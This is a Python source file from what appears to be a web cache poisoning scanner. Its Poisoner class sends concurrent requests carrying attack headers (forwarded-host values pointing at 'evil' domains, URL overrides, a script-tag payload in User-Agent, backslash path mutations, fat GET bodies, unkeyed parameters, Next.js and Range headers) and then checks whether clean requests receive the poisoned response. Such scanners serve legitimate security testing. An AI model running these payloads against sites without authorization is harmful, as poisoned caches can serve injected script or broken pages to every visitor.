import time
import uuid
import random
from typing import List, Dict, Optional
from cpd.http_client import HttpClient
from cpd.logic.baseline import Baseline
from cpd.utils.logger import logger

class Poisoner:
    def __init__(self, baseline: Baseline, headers: Dict[str, str] = None):
        self.baseline = baseline
        self.headers = headers or {}
        self.payload_id = str(uuid.uuid4())[:8]
        # Advanced poisoning signatures based on public writeups (HackerOne, Bugcrowd)
        self.signatures = [
            # Host Header Manipulation
            {"name": "X-Forwarded-Host", "header": "X-Forwarded-Host", "value": f"evil-{self.payload_id}.com"},
            {"name": "X-Host", "header": "X-Host", "value": f"evil-{self.payload_id}.com"},
            {"name": "X-Forwarded-Server", "header": "X-Forwarded-Server", "value": f"evil-{self.payload_id}.com"},
            {"name": "X-HTTP-Host-Override", "header": "X-HTTP-Host-Override", "value": f"evil-{self.payload_id}.com"},
            {"name": "Forwarded", "header": "Forwarded", "value": f"host=evil-{self.payload_id}.com;for=127.0.0.1"},
            
            # Request Line / Path Overrides
            {"name": "X-Original-URL", "header": "X-Original-URL", "value": f"/poison-{self.payload_id}"},
            {"name": "X-Rewrite-URL", "header": "X-Rewrite-URL", "value": f"/poison-{self.payload_id}"},
            
            # Protocol / Port Manipulation
            {"name": "X-Forwarded-Scheme", "header": "X-Forwarded-Scheme", "value": "http"},
            {"name": "X-Forwarded-Proto", "header": "X-Forwarded-Proto", "value": "http"},
            {"name": "X-Forwarded-Port", "header": "X-Forwarded-Port", "value": "1111"},
            {"name": "X-Forwarded-Prefix", "header": "X-Forwarded-Prefix", "value": f"/evil-{self.payload_id}"},
            
            # Header Reflection / Injection targets
            {"name": "Valid-User-Agent", "header": "User-Agent", "value": f"<script>alert('{self.payload_id}')</script>"},
            {"name": "Origin-Reflect", "header": "Origin", "value": f"https://evil-{self.payload_id}.com"},
            {"name": "Accept-Language", "header": "Accept-Language", "value": f"en-evil-{self.payload_id}"},
            {"name": "Accept-Language", "header": "Accept-Language", "value": f"en-evil-{self.payload_id}"},
            
            # Path Normalization / Traversal (User Requested)
            {"name": "Backslash-Path-Replace", "type": "path", "mutation": "backslash_replace"},
            {"name": "Backslash-Last-Path-Replace", "type": "path", "mutation": "backslash_last_slash"},
            
            # Fat GET (Body Poisoning)
            {"name": "Fat-GET", "type": "fat_get", "header": "X-Poison-Fat", "value": f"evil-{self.payload_id}"},

            # CDN / IP Forwarding
            {"name": "Fastly-Client-IP", "header": "Fastly-Client-IP", "value": "8.8.8.8"},
            {"name": "True-Client-IP", "header": "True-Client-IP", "value": "127.0.0.1"},
            {"name": "CF-Connecting-IP", "header": "CF-Connecting-IP", "value": "127.0.0.1"},
            {"name": "X-Real-IP", "header": "X-Real-IP", "value": "127.0.0.1"},
            {"name": "X-Forwarded-For-IP", "header": "X-Forwarded-For", "value": "127.0.0.1"},
            {"name": "Client-IP", "header": "Client-IP", "value": "127.0.0.1"},
            
            # Method Override (Behavioral)
            {"name": "Method-Override-POST", "type": "method_override", "header": "X-HTTP-Method-Override", "value": "POST"},
            {"name": "Method-Override-PUT", "type": "method_override", "header": "X-HTTP-Method-Override", "value": "PUT"},

            # Unkeyed Query Parameter
            {"name": "Unkeyed-Param", "type": "query_param", "param": "utm_content", "value": f"evil-{self.payload_id}"},

            # Vercel / Next.js Targets
            {"name": "Vercel-IP-Country-US", "header": "x-vercel-ip-country", "value": "US"},
            {"name": "Vercel-Forwarded-For", "header": "x-vercel-forwarded-for", "value": "127.0.0.1"},
            {"name": "NextJS-RSC", "type": "method_override", "header": "RSC", "value": "1"},
            {"name": "NextJS-Router-State", "type": "method_override", "header": "Next-Router-State-Tree", "value": "1"},

            # Next.js Prefetch / Data Poisoning
            {"name": "NextJS-Middleware-Prefetch", "type": "method_override", "header": "X-Middleware-Prefetch", "value": "1"},
            {"name": "NextJS-Data", "type": "method_override", "header": "X-Nextjs-Data", "value": "1"},
            {"name": "NextJS-Purpose-Prefetch", "type": "method_override", "header": "Purpose", "value": "prefetch"},

            # Range Header Poisoning (DoS)
            {"name": "Range-Poisoning", "type": "method_override", "header": "Range", "value": "bytes=0-0"},
        ]

    async def run(self, client: HttpClient) -> List[Dict]:
        """
        Execute poisoning attacks.
        """
        logger.info(f"Starting poisoning attempts on {self.baseline.url}")
        
        import asyncio
        findings = []
        for sig in self.signatures:
            # Schedule each signature test as a concurrent task
            findings.append(asyncio.create_task(self._attempt_poison(client, sig)))
            
        results = await asyncio.gather(*findings)
        
        # Filter None results
        valid_findings = [r for r in results if r]
        return valid_findings

    async def _attempt_poison(self, client: HttpClient, signature: Dict[str, str]) -> Optional[Dict]:
        cache_buster = f"cb={int(time.time())}_{random.randint(1000,9999)}"
        headers = self.headers.copy()
        
        # Determine URLs based on signature type
        if signature.get("type") == "path":
            # Mutation logic
            if signature["mutation"] == "backslash_replace":
                # Replace valid path separators with backslashes
                # e.g. https://example.com/foo/bar -> https://example.com\foo\bar
                from urllib.parse import urlparse
                parsed = urlparse(self.baseline.url)
                
                # Reconstruct with backslashes in path
                malicious_path = parsed.path.replace('/', '\\')
                if not malicious_path or malicious_path == '\\':
                     malicious_path = '\\' # Ensure at least root
                
                # Rebuild URL: scheme://netloc + malicious_path + query
                # We append cache buster manually
                target_url = f"{parsed.scheme}://{parsed.netloc}{malicious_path}?{cache_buster}"
                verify_url = f"{self.baseline.url}?{cache_buster}" if '?' not in self.baseline.url else f"{self.baseline.url}&{cache_buster}"
            
            elif signature["mutation"] == "backslash_last_slash":
                # Replace ONLY the LAST slash in the path with a backslash
                # e.g. /path1/subpath/path -> /path1/subpath\path
                from urllib.parse import urlparse
                parsed = urlparse(self.baseline.url)
                path = parsed.path
                
                if '/' in path:
                    # Rfind to locate last slash, replace it
                    last_slash_index = path.rfind('/')
                    # Be careful if it's the very first char and only char e.g. "/"
                    if last_slash_index != -1:
                        malicious_path = path[:last_slash_index] + '\\' + path[last_slash_index+1:]
                        if malicious_path == '\\': 
                             pass # "/" -> "\" is same as replace all, effectively
                    else:
                        malicious_path = path 
                else:
                    malicious_path = path
                
                target_url = f"{parsed.scheme}://{parsed.netloc}{malicious_path}?{cache_buster}"
                verify_url = f"{self.baseline.url}?{cache_buster}" if '?' not in self.baseline.url else f"{self.baseline.url}&{cache_buster}"

        
        elif signature.get("type") == "fat_get":
             # Fat GET: Send GET request with a body
             target_url = f"{self.baseline.url}?{cache_buster}" if '?' not in self.baseline.url else f"{self.baseline.url}&{cache_buster}"
             verify_url = target_url
        
        elif signature.get("type") == "query_param":
             # Inject parameter into URL
             # e.g. /?cb=123&utm_content=evil
             param_str = f"{signature['param']}={signature['value']}"
             target_url = f"{self.baseline.url}?{cache_buster}&{param_str}" if '?' not in self.baseline.url else f"{self.baseline.url}&{cache_buster}&{param_str}"
             # Check if clean request gets poisoned content
             verify_url = f"{self.baseline.url}?{cache_buster}" if '?' not in self.baseline.url else f"{self.baseline.url}&{cache_buster}"

        else:
            # Standard Header Poisoning (and Method Override)
            target_url = f"{self.baseline.url}?{cache_buster}" if '?' not in self.baseline.url else f"{self.baseline.url}&{cache_buster}"
            verify_url = target_url
            headers[signature['header']] = signature['value']

        logger.debug(f"Attempting {signature['name']} on {target_url}")
        
        body = None
        if signature.get("type") == "fat_get":
             body = f"callback=evil{self.payload_id}"

        resp = await client.request("GET", target_url, headers=headers, data=body)
        if not resp:
            return

        # 2. Verification Request (Clean URL with same cache key/buster)
        verify_resp = await client.request("GET", verify_url, headers=self.headers)
        if not verify_resp:
            return

        if signature.get("type") in ["path", "method_override"]:
            # Calculate verify hash
            import hashlib
            verify_hash = hashlib.sha256(verify_resp['body']).hexdigest()
            
            if verify_resp['body'] == resp['body'] and verify_hash != self.baseline.body_hash:
                 verify_resp_2 = await client.request("GET", verify_url, headers=self.headers)
                 if not verify_resp_2:
                     return None
                 
                 verify_hash_2 = hashlib.sha256(verify_resp_2['body']).hexdigest()
                 
                 if verify_hash != verify_hash_2:
                     logger.debug(f"Ignored {signature['name']} - Target appears dynamic (verification requests differed)")
                     return None

                 fresh_cb = f"cb={int(time.time())}_{random.randint(1000,9999)}"
                 fresh_url = f"{self.baseline.url}?{fresh_cb}" if '?' not in self.baseline.url else f"{self.baseline.url}&{fresh_cb}"
                 
                 fresh_resp = await client.request("GET", fresh_url, headers=self.headers)
                 if fresh_resp:
                     fresh_hash = hashlib.sha256(fresh_resp['body']).hexdigest()
                     if fresh_hash == verify_hash:
                         logger.debug(f"Ignored {signature['name']} - Target appears to have drifted (fresh baseline matches verification)")
                         return None
                     
                     if fresh_resp['status'] == verify_resp['status']:
                         len_fresh = len(fresh_resp['body'])
                         len_verify = len(verify_resp['body'])
                         if len_fresh == len_verify:
                             logger.debug(f"Ignored {signature['name']} - Content length identical to fresh baseline ({len_verify} bytes). Likely benign dynamic content.")
                             return None
                         
                         # Optional: Tolerance check (e.g., < 20 bytes diff)
                         if abs(len_fresh - len_verify) < 20:
                             logger.debug(f"Ignored {signature['name']} - Content length similar to fresh baseline (diff {abs(len_fresh - len_verify)}). Likely benign.")
                             return None
                     
                     if fresh_hash != self.baseline.body_hash:
                         logger.debug(f"Ignored {signature['name']} - Target appears chaotic (fresh baseline != original baseline)")
                         return None

                 vuln_type = "PathNormalizationPoisoning" if signature.get("type") == "path" else "MethodOverridePoisoning"
                 msg = f"POTENTIAL VULNERABILITY: {vuln_type}. Clean URL {verify_url} served content from {target_url} (reproducing malicious behavior)"
                 logger.critical(msg)
                 return {
                     "url": self.baseline.url,
                     "target_url": target_url,
                     "verify_url": verify_url,
                     "vulnerability": vuln_type,
                     "details": msg,
                     "signature": signature,
                     "severity": "HIGH"
                 }
            return None

        if signature['value'] in str(verify_resp['headers']) or signature['value'] in str(verify_resp['body']):
             # False Positive Check: Was this value already in the baseline (body OR headers)?
             in_baseline = signature['value'] in str(self.baseline.body) or signature['value'] in str(self.baseline.headers)
             if in_baseline:
                 logger.debug(f"Ignored {signature['name']} - Value '{signature['value']}' found in baseline response")
                 return None

             msg = f"POTENTIAL VULNERABILITY: {signature['name']} reflected in response for {target_url}"
             logger.critical(msg)
             severity = "MEDIUM"
             if "<script" in str(verify_resp['body']):
                  severity = "CRITICAL"
             elif signature.get("type") in ["fat_get", "query_param"]:
                  severity = "HIGH"

             return {
                 "url": self.baseline.url,
                 "target_url": target_url,
                 "vulnerability": "CachePoisoning",
                 "details": msg,
                 "signature": signature,
                 "severity": severity
             }
        else:
             logger.debug(f"Failed {signature['name']}")
             return None
